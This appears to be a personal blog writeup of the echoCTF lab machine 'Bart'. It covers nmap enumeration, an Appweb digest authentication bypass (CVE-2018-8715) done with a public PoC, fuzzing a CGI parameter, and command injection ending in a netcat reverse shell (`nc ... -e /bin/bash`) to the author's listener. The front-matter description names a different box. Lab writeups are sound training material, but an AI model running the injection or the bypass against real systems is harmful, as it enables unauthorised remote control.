---
title: "echoCTF Bart Writeup: Digest Authentication Bypass to root"
date: 2025-08-17
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["authentication bypass", "fuzzing", "ffuf", "web", "CVE-2018-8715"]
description: "Step-by-step guide to cracking Contactlens on echoCTF with file upload exploits and command injection. Perfect for OSCP prep!"
---


# Bart

# Enumeration

## NMAP
```bash
sudo nmap 10.0.50.0 -A -p- -T4
```

## NMAP OUTPUT

```bash
8080/tcp  open     http-proxy
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Digest algorithm=MD5 stale=FALSE opaque=799d5 realm=example.com qop=auth domain=/ nonce=YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODA0MWYyNjo2
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Vary: Accept-Encoding
|     X-Frame-Options: SAMEORIGIN
|     Content-Type: text/html
|     X-Content-Type-Options: nosniff
|     Date: Sun, 17 Aug 2025 12:29:48 GMT
|     Cache-Control: no-cache
|     Content-Length: 229
|     X-XSS-Protection: 1; mode=block
|     Connection: close
|     WWW-Authenticate: Digest realm="example.com", domain="/", qop="auth", nonce="YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODAxZTMyMTo0", opaque="799d5", algorithm="MD5", stale="FALSE"
|     Accept-Ranges: bytes
|     <!DOCTYPE html>
|     <head>
|     <title>Unauthorized</title>
|     <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
|     </head>
|     <body>
|     <h2>Access Error: 401 -- Unauthorized</h2>
|     <pre></pre>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Vary: Accept-Encoding
|     X-Frame-Options: SAMEORIGIN
|     Content-Type: text/html
|     X-Content-Type-Options: nosniff
|     Date: Sun, 17 Aug 2025 12:29:47 GMT
|     Cache-Control: no-cache
|     Content-Length: 229
|     X-XSS-Protection: 1; mode=block
|     Connection: close
|     WWW-Authenticate: Digest realm="example.com", domain="/", qop="auth", nonce="YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODAxZTE4Mjoz", opaque="799d5", algorithm="MD5", stale="FALSE"
|     Accept-Ranges: bytes
|     <!DOCTYPE html>
|     <head>
|     <title>Unauthorized</title>
|     <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
|     </head>
|     <body>
|     <h2>Access Error: 401 -- Unauthorized</h2>
|     <pre></pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Vary: Accept-Encoding
|     X-Frame-Options: SAMEORIGIN
|     Content-Type: text/html
|     X-Content-Type-Options: nosniff
|     Date: Sun, 17 Aug 2025 12:29:47 GMT
|     Cache-Control: no-cache
|     Content-Length: 241
|     X-XSS-Protection: 1; mode=block
|     Connection: close
|     Accept-Ranges: bytes
|     <!DOCTYPE html>
|     <head>
|     <title>Method Not Allowed</title>
|     <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
|     </head>
|     <body>
|     <h2>Access Error: 405 -- Method Not Allowed</h2>
|     <pre></pre>
|     </body>
|_    </html>

```

The NMAP scan found an open port on `8080` and it seems that is a webserver.

Visiting the webserver we are required to provide credentials to proceed.

![Image Description](/images/Pasted%20image%2020250817151937.png)

I found out that this type of authentication i called [Digest Access Authentication](https://en.wikipedia.org/wiki/Digest_access_authentication)

Then tried different kind of default credentials like `admin:admin` `administrato:administrator` `guest:guest` but nothing worked. I did not tried brute forcing as the description of the box clearly mentions that, brute force is not the way to go.

Then I tried to further fingerprint the server using `whatweb` but got nothing interesting back...

```bash
sudo whatweb http://10.0.50.0:8080/ -vv 
```

![Image Description](/images/Pasted%20image%2020250817152353.png)

I also tried using `nc`, but again i could identify the web server running.

```bash
sudo nc -nvC 10.0.50.0 8080

(UNKNOWN) [10.0.50.0] 8080 (http-alt) open
HELP
VERSION

```

Then i tried directory brute forcing with various kind of wordlists but nothing came back

```bash
gobuster dir -u http://10.0.50.0:8080/ -w /usr/share/wordlists/
```

Here I was stuck i did not know what to do next so I went back to the description of the box noticed that a few words where bolded `App` `Web` `embed` `this`.

The i went i head and googled those exact words. And found out that there is indeed a a small **App**lication **Web** server usually found on **embed**ded systems.

![Image Description](/images/Pasted%20image%2020250817153510.png)

So then i went ahead and search for exploits related to that specific web server and authentication bypass since the description says that no credentials are required.

Found an article which also provided a pyhton PoC!

![Image Description](/images/Pasted%20image%2020250817153851.png)

![Image Description](/images/Pasted%20image%2020250817154040.png)

I copied the exploit locally and it run successfully printing back a session cookie as the admin user!

```bash
┌──(kali㉿kali)-[~/Documents/echoCTF/bart/exploits]
└─$ python2.7 ex.py -t http://10.0.50.0:8080 -u admin
----------------------------------------------------------------
Embedthis Appweb/Http Zero-Day Form/Digest Authentication Bypass
----------------------------------------------------------------

[+] Potential appweb/embedthis http, digest method
[!] Exploiting http://10.0.50.0:8080, user admin!
[*] Succesfully exploited, here's your c00kie:
  {'-http-session-': '72::http.session::bda36ec6dce1ac1124b0f2c46795f830'}

```

Then i used a FireFox extension called cookie editor to inject the cookie.

![Image Description](/images/Pasted%20image%2020250817154444.png)

Refreshing the session i was able to login as admin bypassing the authentication!

![Image Description](/images/Pasted%20image%2020250817154514.png)

When the button is clicked we are redirected to `/ETSCTf.cgi?ETSCTF=` and we get `401 Unauthorized`

![Image Description](/images/Pasted%20image%2020250817164718.png)

From here i attempted to FUZZ the value of the `ETSCTF` parameter as well as the paramater name itself.

For the `parameter value` i used a wordlist that checks for directory traversal and another wordlists with just random words in order to see if could guess any value that could return data back, but that was a dead end.

For the `parameter name` i only used a wordlist with just words but that did not yield any results back.

Then i have noticed that the letter `f` in the `ETSCTf.cgi` is not capital so i changed it and got back a different request with a flag!

![Image Description](/images/Pasted%20image%2020250817165825.png)

Now I fuzzed the value of the parameter to see if I hit any value that will give us more information.
To do this i copied the GET request to a file locally which i called `param.txt` and modified the request by adding the `FUZZ` keyword at the value.

![Image Description](/images/Pasted%20image%2020250817170010.png)

Now we can use `ffuf` to brute force that value with a wordlist of our choice.
I forwarded all attempts through burp using the `-x` flag in order to be able to view and analyze the requests.

```bash

ffuf -X GET -request ../param.txt -request-proto "http" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x http://127.0.0.1:8080

```

Then by filtering the requests in burp based on `length` it seems that we can execute commands on the server!

![Image Description](/images/Pasted%20image%2020250817170831.png)

Getting a reverse shell was easy as `nc` was installed on the target server.

```bash
sudo nc -nvlp 80

GET /ETSCTF.cgi?ETSCTF=nc+10.10.11.150+80+-e+/bin/bash
```

![Image Description](/images/Pasted%20image%2020250817171048.png)

ROOT!